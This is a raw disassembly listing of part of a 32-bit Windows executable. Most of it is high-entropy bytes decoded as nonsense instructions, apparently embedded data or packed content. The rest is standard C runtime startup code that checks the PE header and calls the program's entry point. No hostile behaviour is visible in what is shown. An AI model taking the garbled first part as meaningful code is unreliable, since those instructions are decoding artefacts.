  422437:	and    BYTE PTR [edx-0x4a],dh
  42243a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42243b:	inc    ecx
  42243c:	pop    es
  42243d:	jo     0x4224bd
  42243f:	adc    eax,0x984c92c5
  422444:	ins    BYTE PTR es:[edi],dx
  422445:	nop
  422446:	and    ch,BYTE PTR [esi-0xc]
  422449:	push   es
  42244a:	call   0x4a6af774
  42244f:	mov    bl,BYTE PTR [eax-0x46258673]
  422455:	cmp    DWORD PTR ds:0x38ac155e,esi
  42245b:	mov    edx,0x3ec7c6b7
  422460:	mov    bh,0xd9
  422462:	jg     0x422497
  422464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422465:	cmp    DWORD PTR [esp+ebx*1],eax
  422468:	pop    ds
  422469:	jb     0x4224ad
  42246b:	test   DWORD PTR fs:[ebx+edx*2-0x5959e85],eax
  422473:	xor    al,0xec
  422475:	aam    0xb1
  422477:	jecxz  0x422422
  422479:	call   0x943bc46d
  42247e:	int3   
  42247f:	push   edi
  422480:	adc    ebx,DWORD PTR [esi+0x2c8f274b]
  422486:	dec    ebp
  422487:	fs mov ah,0x46
  42248a:	mov    WORD PTR [edi+0x46821ca0],cs
  422490:	sub    BYTE PTR [eax+edx*8],0x51
  422494:	nop
  422495:	loop   0x42242c
  422497:	or     ebx,DWORD PTR [eax]
  422499:	icebp  
  42249a:	inc    edx
  42249b:	stc    
  42249c:	ja     0x4224ea
  42249e:	repz repnz arpl si,cx
  4224a2:	sahf   
  4224a3:	hlt    
  4224a4:	pop    DWORD PTR [ecx-0x783b261]
  4224aa:	dec    esi
  4224ab:	je     0x4224f2
  4224ad:	data16 mov ch,0x95
  4224b0:	or     DWORD PTR [eax-0x4b],edx
  4224b3:	jns    0x422481
  4224b5:	mov    ebx,esi
  4224b7:	fmulp  st(1),st
  4224b9:	lods   ax,WORD PTR ds:[esi]
  4224bb:	jle    0x4224ef
  4224bd:	pop    ds
  4224be:	mov    dl,0x64
  4224c0:	and    al,0x90
  4224c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224c3:	repz call 0x9f0a:0xf74ed86f
  4224cb:	fsub   QWORD PTR [ebx*4+0x2653bd6f]
  4224d2:	add    DWORD PTR [ebp-0x24f1479],0x7514a206
  4224dc:	jns    0x422556
  4224de:	xlat   BYTE PTR ds:[ebx]
  4224df:	or     BYTE PTR [eax-0x4eca9305],dh
  4224e5:	inc    edx
  4224e6:	imul   ecx,edi,0x2c47f87e
  4224ec:	xchg   BYTE PTR ds:0xdd91129b,ch
  4224f2:	push   eax
  4224f3:	cmp    BYTE PTR [ecx],bh
  4224f5:	ror    esp,0x37
  4224f8:	mov    edi,DWORD PTR [esi+0x7b832cab]
  4224fe:	pop    ebx
  4224ff:	adc    ebx,DWORD PTR [eax]
  422501:	jb     0x42252b
  422503:	sbb    BYTE PTR [ebp+0x13e09a63],dh
  422509:	mov    ebx,0xd6bfddfd
  42250e:	loop   0x422561
  422510:	or     al,0xf6
  422512:	out    0x69,eax
  422514:	xor    al,0xd7
  422516:	or     BYTE PTR [edx-0x44],0x17
  42251a:	fdiv   DWORD PTR [ecx+0x31ae05ca]
  422520:	inc    esi
  422521:	ret    
  422522:	adc    esi,DWORD PTR [edx]
  422524:	ffreep st(5)
  422526:	imul   eax,ebp,0x9e213f7f
  42252c:	and    ecx,DWORD PTR [esi-0x177bf735]
  422532:	lods   eax,DWORD PTR ds:[esi]
  422533:	dec    ecx
  422534:	test   DWORD PTR [edx],ecx
  422536:	sub    eax,0x94bad8d5
  42253b:	jne    0x42257a
  42253d:	add    eax,0x36947b3f
  422542:	ins    BYTE PTR es:[edi],dx
  422543:	xor    eax,0x491c86b6
  422548:	or     BYTE PTR [edx],bh
  42254a:	imul   ebp,DWORD PTR [edi+ebx*4+0x5a86e66c],0xd3a990d4
  422555:	out    0x2d,eax
  422557:	or     BYTE PTR [ebx-0x7487515f],bh
  42255d:	dec    edx
  42255e:	dec    esp
  42255f:	enter  0x8f6,0x1e
  422563:	dec    esp
  422564:	ss test al,0xa5
  422567:	int    0x5e
  422569:	je     0x422534
  42256b:	sete   BYTE PTR [edi+0x4f]
  42256f:	pop    edi
  422570:	jge    0x42253b
  422572:	push   cs
  422573:	jo     0x422577
  422575:	repz loopne 0x422598
  422578:	iret   
  422579:	es push eax
  42257b:	jb     0x422574
  42257d:	enter  0xb324,0xa3
  422581:	pop    edx
  422582:	mov    DWORD PTR cs:[edx+0x3c7d13be],edi
  422589:	adc    DWORD PTR [ebp-0x2f],edx
  42258c:	call   0xf163:0x93df0ab
  422593:	mov    al,0xcf
  422595:	and    BYTE PTR ds:0x6da5f7d4,cl
  42259b:	inc    DWORD PTR [ebx]
  42259d:	arpl   ax,ax
  42259f:	out    0x57,al
  4225a1:	in     al,dx
  4225a2:	stos   DWORD PTR es:[edi],eax
  4225a3:	addr16 push 0x812924f1
  4225a9:	add    cl,dh
  4225ab:	aaa    
  4225ac:	jecxz  0x422608
  4225ae:	shl    DWORD PTR [esi+0x66],0xe0
  4225b2:	cmp    ebx,ebx
  4225b4:	inc    ebx
  4225b5:	inc    ebp
  4225b6:	cmp    al,0xc7
  4225b8:	scas   eax,DWORD PTR es:[edi]
  4225b9:	(bad)  
  4225ba:	test   al,0xdf
  4225bc:	cmp    al,0x0
  4225be:	test   ecx,edx
  4225c0:	repnz pop esi
  4225c2:	cld    
  4225c3:	stos   BYTE PTR es:[edi],al
  4225c4:	jno    0x42255e
  4225c6:	std    
  4225c7:	std    
  4225c8:	sbb    BYTE PTR [esi-0x4d],bh
  4225cb:	jno    0x422619
  4225cd:	in     al,dx
  4225ce:	cmc    
  4225cf:	in     al,0x41
  4225d1:	aad    0x52
  4225d3:	and    esp,eax
  4225d5:	adc    BYTE PTR [ebp+0x8],dl
  4225d8:	ror    DWORD PTR [edi+eiz*4+0xdc75c88],cl
  4225df:	pop    esi
  4225e0:	leave  
  4225e1:	jle    0x4225dc
  4225e3:	dec    edx
  4225e4:	retf   
  4225e5:	push   0x15
  4225e7:	jno    0x4225b5
  4225e9:	(bad)  
  4225ea:	in     eax,0xb7
  4225ec:	cdq    
  4225ed:	nop
  4225ee:	sbb    al,0x61
  4225f0:	sbb    eax,0x5790e0c5
  4225f5:	dec    edi
  4225f6:	aaa    
  4225f7:	arpl   WORD PTR [edx+0x4fe2b24d],dx
  4225fd:	arpl   WORD PTR [edx],bx
  4225ff:	lds    ebx,FWORD PTR [esi*8+0x5159414e]
  422606:	mov    cl,0xab
  422608:	mov    esp,0x3995b2a5
  42260d:	mov    ebx,0x8d50990e
  422612:	xlat   BYTE PTR ds:[ebx]
  422613:	data16 sub al,0xf5
  422616:	pop    ss
  422617:	mov    bh,0xaa
  422619:	mov    al,fs:0xad3d177e
  42261f:	fidiv  DWORD PTR [eax-0x7d]
  422622:	lea    ebx,[eax+0x52193cb0]
  422628:	cld    
  422629:	dec    ebp
  42262a:	inc    DWORD PTR [ecx]
  42262c:	scas   al,BYTE PTR es:[edi]
  42262d:	cs mov cl,0xed
  422630:	push   es
  422631:	mov    bh,0xfe
  422633:	addr16 mov ebp,0x3e72640f
  422639:	pop    esi
  42263a:	rol    ecx,1
  42263c:	loop   0x422685
  42263e:	or     al,0x30
  422640:	push   eax
  422641:	lods   al,BYTE PTR ds:[esi]
  422642:	pop    es
  422643:	aaa    
  422644:	out    dx,eax
  422645:	call   0x492ebef
  42264a:	jmp    0x422615
  42264c:	dec    ebp
  42264d:	jecxz  0x422637
  42264f:	mov    ds:0x7c66b8a6,eax
  422654:	xlat   BYTE PTR ds:[ebx]
  422655:	ds ret 
  422657:	scas   al,BYTE PTR es:[edi]
  422658:	fistp  WORD PTR [edi+0x7b3f5d92]
  42265e:	data16 fs (bad) 
  422661:	ds pop edi
  422663:	push   cs
  422664:	(bad)  [edx]
  422666:	das    
  422667:	scas   eax,DWORD PTR es:[edi]
  422668:	or     BYTE PTR [ebx+ebx*2-0x50],al
  42266c:	popf   
  42266d:	in     eax,dx
  42266e:	mov    eax,ds:0x3a53d5fc
  422673:	xor    edi,DWORD PTR [ebp+0x5]
  422676:	out    dx,al
  422677:	fldlg2 
  422679:	cmp    DWORD PTR [edi+0x7d],edx
  42267c:	pushf  
  42267d:	pop    ebp
  42267e:	repz das 
  422680:	out    0xc9,eax
  422682:	loopne 0x42264a
  422684:	jnp    0x422687
  422686:	sub    DWORD PTR [eax+0x752705ec],ecx
  42268c:	out    0x4b,eax
  42268e:	or     edx,ebp
  422690:	and    al,0xe0
  422692:	mov    bl,0x65
  422694:	mov    ah,0xd6
  422696:	inc    edi
  422697:	jmp    DWORD PTR [edx-0x1a]
  42269a:	inc    ebp
  42269b:	and    ch,BYTE PTR [ebp+0x3daa5a48]
  4226a1:	mov    bh,0x4a
  4226a3:	fist   WORD PTR [eax-0x650cb9a6]
  4226a9:	enter  0x890a,0x20
  4226ad:	test   BYTE PTR [ebx+0x6e],0xa
  4226b1:	in     eax,0x6e
  4226b3:	sub    edi,DWORD PTR [ecx]
  4226b5:	cmp    DWORD PTR [edx],esi
  4226b7:	or     edi,eax
  4226b9:	test   BYTE PTR [esi+0x54],ch
  4226bc:	test   BYTE PTR [ebx+0x73f88fa0],dl
  4226c2:	jmp    0x2c6b0ee2
  4226c7:	jb     0x4226bc
  4226c9:	repz inc ebx
  4226cb:	mov    dh,0xd2
  4226cd:	setp   BYTE PTR [ebx+0x48]
  4226d1:	mov    ebp,gs
  4226d3:	sbb    ebp,eax
  4226d5:	push   ebp
  4226d6:	in     al,0xca
  4226d8:	daa    
  4226d9:	inc    edi
  4226da:	mov    WORD PTR [ebp+0x788be04e],gs
  4226e0:	(bad)  
  4226e1:	and    eax,0xf604873a
  4226e6:	fidivr WORD PTR [eax-0x13629ed2]
  4226ec:	retf   0xe854
  4226ef:	adc    dl,bh
  4226f1:	cmp    al,0x68
  4226f3:	(bad)  
  4226f5:	dec    BYTE PTR [ebp-0x33142427]
  4226fb:	sbb    bh,ah
  4226fd:	addr16 retf 
  4226ff:	push   ebp
  422700:	dec    edi
  422701:	sub    BYTE PTR [edi-0x524a0810],dl
  422707:	dec    esi
  422708:	shl    cl,1
  42270a:	jmp    0x3745:0xedd72357
  422711:	ror    ah,0x69
  422714:	lods   eax,DWORD PTR ds:[esi]
  422715:	inc    ebp
  422716:	in     al,0xce
  422718:	les    edi,FWORD PTR [ebp+0x74]
  42271b:	mov    ecx,0xc244b482
  422720:	iret   
  422721:	sub    eax,0x4a090357
  422726:	xchg   edi,eax
  422727:	call   DWORD PTR [edi]
  422729:	ins    BYTE PTR es:[edi],dx
  42272a:	fwait
  42272b:	add    al,0xc5
  42272d:	xor    edi,DWORD PTR [ebx+ebp*8+0x5b124c06]
  422734:	xchg   DWORD PTR [edx+0x3620681d],esp
  42273a:	adc    al,0xaf
  42273c:	inc    esp
  42273d:	inc    DWORD PTR [eax+ebx*4-0x25]
  422741:	nop
  422742:	lds    esp,FWORD PTR [ecx+0x4ef55659]
  422748:	push   ss
  422749:	cli    
  42274a:	xor    DWORD PTR [edx],esp
  42274c:	sbb    ch,BYTE PTR [esi+0x44]
  42274f:	int3   
  422750:	mov    ds:0x59838594,eax
  422755:	test   eax,0xb417a77c
  42275a:	stos   DWORD PTR es:[edi],eax
  42275b:	outs   dx,BYTE PTR ds:[esi]
  42275c:	mov    dh,0x88
  42275e:	xchg   edx,eax
  42275f:	aas    
  422760:	mov    ah,0xb6
  422762:	loopne 0x422775
  422764:	jbe    0x42274c
  422766:	adc    al,0xd6
  422768:	xchg   BYTE PTR [ebx+0x2113a50d],al
  42276e:	mov    ch,0x7c
  422770:	adc    eax,0xe161615
  422775:	and    al,cl
  422777:	ror    BYTE PTR [edi+0xf],cl
  42277a:	xchg   bl,dl
  42277c:	aaa    
  42277d:	mov    eax,ds:0xb7e76f8f
  422782:	and    edi,DWORD PTR ds:0xe7666696
  422788:	adc    BYTE PTR [ebp+eax*2-0x52],cl
  42278c:	push   ebx
  42278d:	pop    edx
  42278e:	mov    ecx,edi
  422790:	push   ds
  422791:	jg     0x42274c
  422793:	inc    edx
  422794:	mov    BYTE PTR [esi+0x2faeceb1],bh
  42279a:	ja     0x4227dd
  42279c:	idiv   cl
  42279e:	push   0xfffffff2
  4227a0:	or     dl,ch
  4227a2:	mov    esi,0xb6afd413
  4227a7:	or     BYTE PTR [ebp+eax*8-0x2c],dh
  4227ab:	jg     0x42281f
  4227ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227ae:	fnsave [ebx+0xc]
  4227b1:	jle    0x422733
  4227b3:	xchg   esp,eax
  4227b4:	(bad)  
  4227b5:	stc    
  4227b6:	mov    al,0xb2
  4227b8:	adc    al,0x76
  4227ba:	lds    ecx,FWORD PTR [eax+0x22ea7373]
  4227c0:	out    0xf8,al
  4227c2:	xchg   edi,eax
  4227c3:	out    0x1f,eax
  4227c5:	adc    DWORD PTR [ebp-0x5],edi
  4227c8:	int3   
  4227c9:	mov    edi,0x724307a4
  4227ce:	fwait
  4227cf:	ret    
  4227d0:	mov    ebx,0x47098c16
  4227d5:	das    
  4227d6:	inc    ebx
  4227d7:	es xchg ebp,eax
  4227d9:	lds    esi,FWORD PTR [eax-0x63]
  4227dc:	in     al,dx
  4227dd:	scas   eax,DWORD PTR es:[edi]
  4227de:	mov    DWORD PTR [edi-0xfce4b24],ebp
  4227e4:	dec    eax
  4227e5:	push   esp
  4227e6:	shl    BYTE PTR [ebp+0x75fdd70b],cl
  4227ec:	fist   WORD PTR [edi+0x5b7010f7]
  4227f2:	test   DWORD PTR [edx+0x691849f4],0xfd681fdd
  4227fc:	add    eax,DWORD PTR [ecx-0x78a82bf3]
  422802:	jo     0x422874
  422804:	jb     0x422866
  422806:	loope  0x42280c
  422808:	rol    DWORD PTR [edi],cl
  42280a:	int    0x4f
  42280c:	jb     0x4227ec
  42280e:	mov    bh,BYTE PTR [ebp+0x39d53267]
  422814:	scas   eax,DWORD PTR es:[edi]
  422815:	neg    DWORD PTR [edx+0x6295f45d]
  42281b:	ins    BYTE PTR es:[edi],dx
  42281c:	lods   al,BYTE PTR ds:[esi]
  42281d:	fist   WORD PTR [esi]
  42281f:	out    0xd6,al
  422821:	pop    edx
  422822:	inc    eax
  422823:	outs   dx,BYTE PTR ds:[esi]
  422824:	inc    esi
  422825:	lods   al,BYTE PTR ds:[esi]
  422826:	pop    es
  422827:	push   ds
  422828:	sub    esi,ecx
  42282a:	outs   dx,DWORD PTR ds:[esi]
  42282b:	mov    esp,DWORD PTR [eax]
  42282d:	inc    eax
  42282e:	je     0x4227e8
  422830:	xchg   BYTE PTR [ebx-0x33],dh
  422833:	dec    ebx
  422834:	inc    eax
  422835:	fs push esi
  422837:	cmp    BYTE PTR [edx],0xa8
  42283a:	mov    ch,0x9e
  42283c:	dec    edx
  42283d:	sar    DWORD PTR [edi],cl
  42283f:	mov    edx,edx
  422841:	(bad)  
  422842:	xor    edx,DWORD PTR [ebp-0x58b5e8c4]
  422848:	mov    ah,0x6d
  42284a:	sub    bh,ch
  42284c:	bound  eax,QWORD PTR [edx]
  42284e:	mov    edx,0xfa898e5
  422853:	or     DWORD PTR [esi],eax
  422855:	mov    ds:0x706491aa,al
  42285a:	fucomip st,st(5)
  42285c:	mov    bl,0xd6
  42285e:	mov    WORD PTR [eax],?
  422860:	fsub   DWORD PTR [edi+0x77]
  422863:	push   ecx
  422864:	push   ebx
  422865:	jbe    0x422831
  422867:	sub    BYTE PTR [eax+eax*4],bh
  42286a:	xor    edi,DWORD PTR ds:0x3311d442
  422870:	pushf  
  422871:	mov    ch,0x5c
  422873:	and    bh,dl
  422875:	mov    ebx,0x36eb69db
  42287a:	test   BYTE PTR [edi+ecx*2+0x72],al
  42287e:	or     cl,al
  422880:	in     al,0xfb
  422882:	retf   
  422883:	cmp    DWORD PTR cs:[esi-0x5e964bf9],esp
  42288a:	js     0x4228c8
  42288c:	sbb    eax,0x8fde9a9f
  422891:	add    DWORD PTR [eax-0x6d963bad],eax
  422897:	je     0x422878
  422899:	pop    esp
  42289a:	jo     0x422889
  42289c:	jp     0x42291b
  42289e:	or     eax,0xbdf68882
  4228a3:	in     al,dx
  4228a4:	inc    ecx
  4228a5:	(bad)  
  4228a6:	clc    
  4228a7:	ret    0x14ea
  4228aa:	js     0x422855
  4228ac:	xlat   BYTE PTR ds:[ebx]
  4228ad:	dec    esp
  4228ae:	jbe    0x422888
  4228b0:	xor    DWORD PTR ss:[ebp+0x45],ebx
  4228b4:	jmp    0xff07:0x2ec7ffbf
  4228bb:	call   0x80de0bc9
  4228c0:	ret    
  4228c1:	std    
  4228c2:	lea    ebx,[ecx+0x7c]
  4228c5:	xchg   esp,eax
  4228c6:	ror    DWORD PTR [esi-0x45c678f4],0xd0
  4228cd:	cmc    
  4228ce:	scas   al,BYTE PTR es:[edi]
  4228cf:	xchg   ebp,eax
  4228d0:	push   es
  4228d1:	je     0x422942
  4228d3:	or     al,0x35
  4228d5:	paddsw mm7,QWORD PTR [edx+edi*2]
  4228d9:	and    eax,0x582a7b80
  4228de:	dec    edi
  4228df:	jl     0x422862
  4228e1:	xlat   BYTE PTR ds:[ebx]
  4228e2:	adc    BYTE PTR [edx-0x79],bh
  4228e5:	scas   eax,DWORD PTR es:[edi]
  4228e6:	ins    BYTE PTR es:[edi],dx
  4228e7:	sub    al,bl
  4228e9:	push   ecx
  4228ea:	rcr    ecx,cl
  4228ec:	sahf   
  4228ed:	les    ecx,FWORD PTR [ebx+0x46]
  4228f0:	shl    DWORD PTR [edx-0x51],cl
  4228f3:	retf   
  4228f4:	icebp  
  4228f5:	or     edi,DWORD PTR [ebp-0x17813cde]
  4228fb:	ds push ds
  4228fd:	adc    cl,ch
  4228ff:	ins    DWORD PTR es:[edi],dx
  422900:	addr16 test eax,0x185aa
  422906:	rol    BYTE PTR [ebx-0x2e92a0a5],0xe7
  42290d:	adc    cl,BYTE PTR [edi+0xd]
  422910:	inc    edx
  422911:	add    BYTE PTR [ebx-0x744c458a],0x91
  422918:	push   ss
  422919:	cmp    ah,ch
  42291b:	ret    0xbd24
  42291e:	dec    eax
  42291f:	adc    ebx,edx
  422921:	ins    BYTE PTR es:[edi],dx
  422922:	loope  0x4228b1
  422924:	jecxz  0x4228fe
  422926:	fsub   st(7),st
  422928:	ret    
  422929:	inc    edx
  42292a:	sub    al,0x58
  42292c:	mov    edx,0x4c076951
  422931:	or     bh,BYTE PTR [edi+esi*4+0x7c03946d]
  422938:	pop    ss
  422939:	in     al,0x5e
  42293b:	sbb    DWORD PTR [edi-0x6799b41e],edi
  422941:	lods   al,BYTE PTR ds:[esi]
  422942:	in     eax,dx
  422943:	or     ebp,eax
  422945:	xchg   ebx,eax
  422946:	ja     0x422923
  422948:	test   edi,0x26ef473b
  42294e:	xchg   esp,eax
  42294f:	mov    eax,0x7cd2d7a4
  422954:	out    dx,eax
  422955:	das    
  422956:	sbb    esi,DWORD PTR [edx+0x41d1cffc]
  42295c:	push   edx
  42295d:	scas   eax,DWORD PTR es:[edi]
  42295e:	pop    edi
  42295f:	imul   ebp,DWORD PTR [ecx-0x5e89cf80],0xc86f5ef6
  422969:	mov    ecx,0x64fd486c
  42296e:	xchg   esi,eax
  42296f:	mov    ds:0x5462e2d4,al
  422974:	ds aaa 
  422976:	cmp    al,0xc
  422978:	fcomi  st,st(6)
  42297a:	and    al,0xf1
  42297c:	xor    WORD PTR [ebx+0x1b34fffa],bx
  422983:	xchg   BYTE PTR [esi-0x500e9ba8],ah
  422989:	cmp    BYTE PTR [esi+ecx*4-0x5a],bl
  42298d:	push   edx
  42298e:	or     esi,DWORD PTR [eax+0x6c]
  422991:	sti    
  422992:	cmp    BYTE PTR [esp-0x7e],al
  422996:	inc    ebp
  422997:	(bad)  
  422999:	push   eax
  42299a:	mov    esi,0xf0d36864
  42299f:	and    edi,DWORD PTR [edi]
  4229a1:	in     eax,0xb
  4229a3:	in     eax,dx
  4229a4:	xchg   ebp,eax
  4229a5:	jl     0x4229e9
  4229a7:	out    0xc3,eax
  4229a9:	push   eax
  4229aa:	adc    esi,0x59
  4229ad:	add    DWORD PTR [ebx+0x6a0ec256],0x4b
  4229b4:	adc    dl,ch
  4229b6:	and    eax,DWORD PTR [eax-0x18564e4]
  4229bc:	aaa    
  4229bd:	cmp    DWORD PTR [eax-0x42],edx
  4229c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229c1:	lds    esp,FWORD PTR [eax]
  4229c3:	mov    ecx,0x7105bf7b
  4229c8:	adc    DWORD PTR [edi-0x779ec1e3],eax
  4229ce:	and    al,0xf9
  4229d0:	xchg   BYTE PTR [ebp-0x3087f915],cl
  4229d6:	push   ss
  4229d7:	rcr    ebp,0x9f
  4229da:	xchg   ebp,eax
  4229db:	das    
  4229dc:	push   ecx
  4229dd:	ror    al,1
  4229df:	(bad)  
  4229e0:	fidiv  DWORD PTR [ebp-0x3a71af64]
  4229e6:	adc    ebp,DWORD PTR [ebp-0x43]
  4229e9:	push   ds
  4229ea:	int3   
  4229eb:	xchg   DWORD PTR [eax+edi*8+0x3e],edi
  4229ef:	xor    DWORD PTR [esi+0x3e],0xfffffff6
  4229f3:	push   0x0
  4229f5:	call   DWORD PTR ds:0x42813c
  4229fb:	push   0x0
  4229fd:	push   0x0
  4229ff:	call   DWORD PTR ds:0x428030
  422a05:	xor    eax,eax
  422a07:	add    esp,0x10
  422a0a:	ret    0x10
  422a0d:	nop
  422a0e:	nop
  422a0f:	nop
  422a10:	jmp    DWORD PTR ds:0x428130
  422a16:	cmp    DWORD PTR ds:0x464d5c,0x1
  422a1d:	jne    0x422a24
  422a1f:	call   0x422f62
  422a24:	push   DWORD PTR [esp+0x4]
  422a28:	call   0x422deb
  422a2d:	push   0xff
  422a32:	call   DWORD PTR ds:0x46444c
  422a38:	pop    ecx
  422a39:	pop    ecx
  422a3a:	ret    
  422a3b:	cmp    DWORD PTR ds:0x464d5c,0x1
  422a42:	jne    0x422a49
  422a44:	call   0x422f62
  422a49:	push   DWORD PTR [esp+0x4]
  422a4d:	call   0x422deb
  422a52:	push   0xff
  422a57:	call   0x422c31
  422a5c:	pop    ecx
  422a5d:	pop    ecx
  422a5e:	ret    
  422a5f:	push   0x60
  422a61:	push   0x428168
  422a66:	call   0x423950
  422a6b:	mov    edi,0x94
  422a70:	mov    eax,edi
  422a72:	call   0x4239a0
  422a77:	mov    DWORD PTR [ebp-0x18],esp
  422a7a:	mov    esi,esp
  422a7c:	mov    DWORD PTR [esi],edi
  422a7e:	push   esi
  422a7f:	call   DWORD PTR ds:0x428068
  422a85:	mov    ecx,DWORD PTR [esi+0x10]
  422a88:	mov    DWORD PTR ds:0x464d64,ecx
  422a8e:	mov    eax,DWORD PTR [esi+0x4]
  422a91:	mov    ds:0x464d70,eax
  422a96:	mov    edx,DWORD PTR [esi+0x8]
  422a99:	mov    DWORD PTR ds:0x464d74,edx
  422a9f:	mov    esi,DWORD PTR [esi+0xc]
  422aa2:	and    esi,0x7fff
  422aa8:	mov    DWORD PTR ds:0x464d68,esi
  422aae:	cmp    ecx,0x2
  422ab1:	je     0x422abf
  422ab3:	or     esi,0x8000
  422ab9:	mov    DWORD PTR ds:0x464d68,esi
  422abf:	shl    eax,0x8
  422ac2:	add    eax,edx
  422ac4:	mov    ds:0x464d6c,eax
  422ac9:	xor    esi,esi
  422acb:	push   esi
  422acc:	mov    edi,DWORD PTR ds:0x428044
  422ad2:	call   edi
  422ad4:	cmp    WORD PTR [eax],0x5a4d
  422ad9:	jne    0x422afa
  422adb:	mov    ecx,DWORD PTR [eax+0x3c]
  422ade:	add    ecx,eax
  422ae0:	cmp    DWORD PTR [ecx],0x4550
  422ae6:	jne    0x422afa
  422ae8:	movzx  eax,WORD PTR [ecx+0x18]
  422aec:	cmp    eax,0x10b
  422af1:	je     0x422b12
  422af3:	cmp    eax,0x20b
  422af8:	je     0x422aff
  422afa:	mov    DWORD PTR [ebp-0x1c],esi
  422afd:	jmp    0x422b26
  422aff:	cmp    DWORD PTR [ecx+0x84],0xe
  422b06:	jbe    0x422afa
  422b08:	xor    eax,eax
  422b0a:	cmp    DWORD PTR [ecx+0xf8],esi
  422b10:	jmp    0x422b20
  422b12:	cmp    DWORD PTR [ecx+0x74],0xe
  422b16:	jbe    0x422afa
  422b18:	xor    eax,eax
  422b1a:	cmp    DWORD PTR [ecx+0xe8],esi
  422b20:	setne  al
  422b23:	mov    DWORD PTR [ebp-0x1c],eax
  422b26:	push   0x1
  422b28:	call   0x4238fd
  422b2d:	pop    ecx
  422b2e:	test   eax,eax
  422b30:	jne    0x422b3a
  422b32:	push   0x1c
  422b34:	call   0x422a3b
  422b39:	pop    ecx
  422b3a:	call   0x423874
  422b3f:	test   eax,eax
  422b41:	jne    0x422b4b
  422b43:	push   0x10
  422b45:	call   0x422a3b
  422b4a:	pop    ecx
  422b4b:	call   0x42375d
  422b50:	mov    DWORD PTR [ebp-0x4],esi
  422b53:	call   0x42355f
  422b58:	test   eax,eax
  422b5a:	jge    0x422b64
  422b5c:	push   0x1b
  422b5e:	call   0x422a16
  422b63:	pop    ecx
  422b64:	call   DWORD PTR ds:0x428064
  422b6a:	mov    ds:0x465514,eax
  422b6f:	call   0x42343d
  422b74:	mov    ds:0x464d54,eax
  422b79:	call   0x42339b
  422b7e:	test   eax,eax
  422b80:	jge    0x422b8a
  422b82:	push   0x8
  422b84:	call   0x422a16
  422b89:	pop    ecx
  422b8a:	call   0x423168
  422b8f:	test   eax,eax
  422b91:	jge    0x422b9b
  422b93:	push   0x9
  422b95:	call   0x422a16
  422b9a:	pop    ecx
  422b9b:	call   0x422c73
  422ba0:	mov    DWORD PTR [ebp-0x20],eax
  422ba3:	cmp    eax,esi
  422ba5:	je     0x422bae
  422ba7:	push   eax
  422ba8:	call   0x422a16
  422bad:	pop    ecx
  422bae:	mov    DWORD PTR [ebp-0x38],esi
  422bb1:	lea    eax,[ebp-0x64]
  422bb4:	push   eax
  422bb5:	call   DWORD PTR ds:0x428060
  422bbb:	call   0x4230ff
  422bc0:	mov    DWORD PTR [ebp-0x68],eax
  422bc3:	test   BYTE PTR [ebp-0x38],0x1
  422bc7:	je     0x422bcf
  422bc9:	movzx  eax,WORD PTR [ebp-0x34]
  422bcd:	jmp    0x422bd2
  422bcf:	push   0xa
  422bd1:	pop    eax
  422bd2:	push   eax
  422bd3:	push   DWORD PTR [ebp-0x68]
  422bd6:	push   esi
  422bd7:	push   esi
  422bd8:	call   edi
  422bda:	push   eax
  422bdb:	call   0x421880
  422be0:	mov    edi,eax
  422be2:	mov    DWORD PTR [ebp-0x6c],edi
  422be5:	cmp    DWORD PTR [ebp-0x1c],esi
  422be8:	jne    0x422bf0
  422bea:	push   edi
  422beb:	call   0x422dab
  422bf0:	call   0x422dcd
  422bf5:	jmp    0x422c22
  422bf7:	mov    eax,DWORD PTR [ebp-0x14]
  422bfa:	mov    ecx,DWORD PTR [eax]
  422bfc:	mov    ecx,DWORD PTR [ecx]
  422bfe:	mov    DWORD PTR [ebp-0x70],ecx
  422c01:	push   eax
  422c02:	push   ecx
  422c03:	call   0x422f9b
  422c08:	pop    ecx
  422c09:	pop    ecx
  422c0a:	ret    
  422c0b:	mov    esp,DWORD PTR [ebp-0x18]
  422c0e:	mov    edi,DWORD PTR [ebp-0x70]
  422c11:	cmp    DWORD PTR [ebp-0x1c],0x0
  422c15:	jne    0x422c1d
  422c17:	push   edi
  422c18:	call   0x422dbc
  422c1d:	call   0x422ddc
  422c22:	or     DWORD PTR [ebp-0x4],0xffffffff
  422c26:	mov    eax,edi
  422c28:	lea    esp,[ebp-0x7c]
  422c2b:	call   0x42398b
  422c30:	ret    
  422c31:	push   0x428184
  422c36:	call   DWORD PTR ds:0x428044
  422c3c:	test   eax,eax
  422c3e:	je     0x422c56
  422c40:	push   0x428174
  422c45:	push   eax
  422c46:	call   DWORD PTR ds:0x42804c
  422c4c:	test   eax,eax
  422c4e:	je     0x422c56
  422c50:	push   DWORD PTR [esp+0x4]
  422c54:	call   eax
  422c56:	push   DWORD PTR [esp+0x4]
  422c5a:	call   DWORD PTR ds:0x42806c
  422c60:	int3   
  422c61:	push   0x8
  422c63:	call   0x423b0f
  422c68:	pop    ecx
  422c69:	ret    
  422c6a:	push   0x8
  422c6c:	call   0x423a7b
  422c71:	pop    ecx
  422c72:	ret    
  422c73:	mov    eax,ds:0x465510
  422c78:	test   eax,eax
  422c7a:	je     0x422c7e
  422c7c:	call   eax
  422c7e:	push   esi
  422c7f:	push   edi
  422c80:	mov    ecx,0x42a00c
  422c85:	mov    edi,0x42a018
  422c8a:	xor    eax,eax
  422c8c:	cmp    ecx,edi
  422c8e:	mov    esi,ecx
  422c90:	jae    0x422ca9
  422c92:	test   eax,eax
  422c94:	jne    0x422cd5
  422c96:	mov    ecx,DWORD PTR [esi]
  422c98:	test   ecx,ecx
  422c9a:	je     0x422c9e
  422c9c:	call   ecx
  422c9e:	add    esi,0x4
  422ca1:	cmp    esi,edi
  422ca3:	jb     0x422c92
  422ca5:	test   eax,eax
  422ca7:	jne    0x422cd5
  422ca9:	push   0x4237a1
  422cae:	call   0x423c20
  422cb3:	mov    esi,0x42a000
  422cb8:	mov    eax,esi
  422cba:	mov    edi,0x42a008
  422cbf:	cmp    eax,edi
  422cc1:	pop    ecx
  422cc2:	jae    0x422cd3
  422cc4:	mov    eax,DWORD PTR [esi]
  422cc6:	test   eax,eax
  422cc8:	je     0x422ccc
  422cca:	call   eax
  422ccc:	add    esi,0x4
  422ccf:	cmp    esi,edi
  422cd1:	jb     0x422cc4
  422cd3:	xor    eax,eax
  422cd5:	pop    edi
  422cd6:	pop    esi
